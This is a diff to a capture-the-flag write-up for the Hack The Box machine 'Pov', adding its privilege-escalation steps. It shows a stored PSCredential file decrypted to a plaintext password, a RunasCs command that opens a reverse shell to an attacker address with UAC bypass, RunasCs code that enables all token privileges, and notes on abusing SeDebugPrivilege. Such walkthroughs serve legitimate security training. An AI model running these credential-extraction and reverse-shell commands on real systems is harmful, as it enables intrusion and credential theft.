@@ -1,5 +1,5 @@
 ---
-description: 'IP: 10.10.11.251'
+description: 'IP: 10.10.11.251 - Platform: Windows - Difficulty: Medium'
 cover: ../.gitbook/assets/Pov.png
 coverY: 338.72222222222223
 layout:
@@ -250,12 +250,178 @@ Finally, after replacing the URL encoded value of the generated payload with the
 
 <figure><img src="../.gitbook/assets/Screenshot 2024-01-30 011654 (1).png" alt=""><figcaption><p>Plug-in our payload!</p></figcaption></figure>
 
-Now, we have gained a shell as `POV/sfitz`
+Now, we have gained a shell as <mark style="color:yellow;">`POV\sfitz`</mark>
 
 <figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption><p>Got da shell!!</p></figcaption></figure>
 
 ## PRIVILEGE ESCALATION <a href="#privilege-escalation" id="privilege-escalation"></a>
 
+### Enumeration
+
+Getting users SID:
+
+<pre><code><strong>PS C:\windows\system32\inetsrv> wmic useraccount get name,sid
+</strong>wmic useraccount get name,sid
+Name                SID                                            
+Administrator       S-1-5-21-2506154456-4081221362-271687478-500   
+alaading            S-1-5-21-2506154456-4081221362-271687478-1001  
+DefaultAccount      S-1-5-21-2506154456-4081221362-271687478-503   
+Guest               S-1-5-21-2506154456-4081221362-271687478-501   
+sfitz               S-1-5-21-2506154456-4081221362-271687478-1000  
+WDAGUtilityAccount  S-1-5-21-2506154456-4081221362-271687478-504
+</code></pre>
+
+So <mark style="color:yellow;">`sfitz`</mark> lacks the privilege to receive the user flag; perhaps <mark style="color:yellow;">`alaading`</mark> does?
+
 After a bit of exploring, I find this file:
 
-<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 012116.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 012116.png" alt=""><figcaption><p>Stumble upon a PSCredential file</p></figcaption></figure>
+
+{% hint style="info" %}
+**Password, Pa\$$w0rd, P455w0rd!!!**\
+
+
+**Can I access the password directly from the PSCredential object?**&#x20;
+
+* As you can see, it’s stored as a secure string.
+* The password will not be returned to you in plain text by <mark style="color:orange;">**`$cred.Password`**</mark>.&#x20;
+* As opposed to a password in plain text, <mark style="color:orange;">**`$cred.Password|Convertfrom-SecureString`**</mark> will ONLY provide you with cipher data.
+
+\
+The <mark style="color:orange;">**`GetNetworkCredential()`**</mark> method is a feature of the PSCredential object. This technique can be used to decrypt the password stored in the PSCredential object.
+
+When I invoke this method and do **Get-Member,** it will show you the properties of the object and you will find a property called Password. use the last command <mark style="color:orange;">**`$cred.GetNetworkCredential().Password`**</mark> and it will return the password in plain text.&#x20;
+{% endhint %}
+
+We could directly parsing from XML:
+
+```
+PS C:\Users\sfitz\Documents> ls
+
+
+    Directory: C:\Users\sfitz\Documents
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       12/25/2023   2:26 PM           1838 connection.xml                                                        
+
+
+PS C:\Users\sfitz\Documents> $cred = Import-CliXml -Path connection.xml; $cred.GetNetworkCredential() | Format-List *
+
+
+UserName       : alaading
+Password       : f8g**********1m3
+SecurePassword : System.Security.SecureString
+Domain         : 
+```
+
+
+
+Using the given credential, we would be using a PowerShell script to trigger a reverse shell:
+
+```
+PS C:\windows\system32\inetsrv> $username = 'alaading'
+PS C:\windows\system32\inetsrv> $password = 'f8g**********1m3'
+PS C:\windows\system32\inetsrv> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+PS C:\windows\system32\inetsrv> $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
+PS C:\windows\system32\inetsrv> Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {YOUR_POWERSHELL_CODE}
+```
+
+Boom?!
+
+<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 013115.png" alt=""><figcaption><p>Now we are alaading</p></figcaption></figure>
+
+### Gaining shell as Administrator
+
+Checking the privilege of <mark style="color:yellow;">`POV\alaading`</mark>:
+
+```
+PS C:\Users\alaading> whoami
+pov\alaading
+PS C:\Users\alaading> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeDebugPrivilege              Debug programs                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled 
+```
+
+#### Understanding about **`SeDebugPrivilege`**&#x20;
+
+By itself, `SeDebugPrivilege` gives a process the ability to view and modify the memory of other processes. Regardless of security descriptors, SeDebugPrivilege grants the token bearer access to any process or thread.&#x20;
+
+{% hint style="info" %}
+It's important to remember that attackers frequently enable this privilege in order to gain greater access to thread and process objects. Many C2 agents come with built-in code that allows you to do this instantly, and <mark style="color:red;">`mimikatz`</mark> also has a command that allows you to enable **`SeDebugPrivilege`**.\
+\
+Because it allows the creation of new remote threads in a target process, malware also takes advantage of this privilege to perform code injection into otherwise trustworthy processes.
+{% endhint %}
+
+As we could see on this machine, <mark style="color:yellow;">`alaading`</mark> does not have `SeDebugPrivilege` enabled. So, to bypass this, we could import [RunasCs](https://github.com/antonioCoco/RunasCs/tree/master).
+
+**RunasCs** is a tool that allows you to use explicit credentials to run particular processes with permissions different from what our shell current provides.
+
+As you can see below, **RunasCs** enables a list of privileges for a specific security token.
+
+```
+public static string EnableAllPrivileges(IntPtr token)
+    {
+        string output = "";
+        string[] privileges = { "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeDelegateSessionUserImpersonatePrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege", "SeUndockPrivilege", "SeUnsolicitedInputPrivilege" };
+        foreach (string privilege in privileges)
+        {
+            output += EnablePrivilege(privilege, token);
+        }
+        return output;
+    }
+```
+
+We would use it to spawn another shell:
+
+```
+PS C:\Users\alaading> .\RunasCs.exe alaading f8g**********1m3 cmd.exe -r 10.10.X.X:7777 --bypass-uac
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-78c62$\Default
+[+] Async process 'C:\Windows\system32\cmd.exe' with pid 1480 created in background.
+```
+
+<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 020018.png" alt=""><figcaption><p>Getting a new shell with RunasCs</p></figcaption></figure>
+
+With this given shell, it is interesting to know that&#x20;
+
+```
+C:\Windows\system32>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeDebugPrivilege              Debug programs                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled 
+
+C:\Windows\system32>powershell
+powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State  
+============================= ============================== =======
+SeDebugPrivilege              Debug programs                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+```
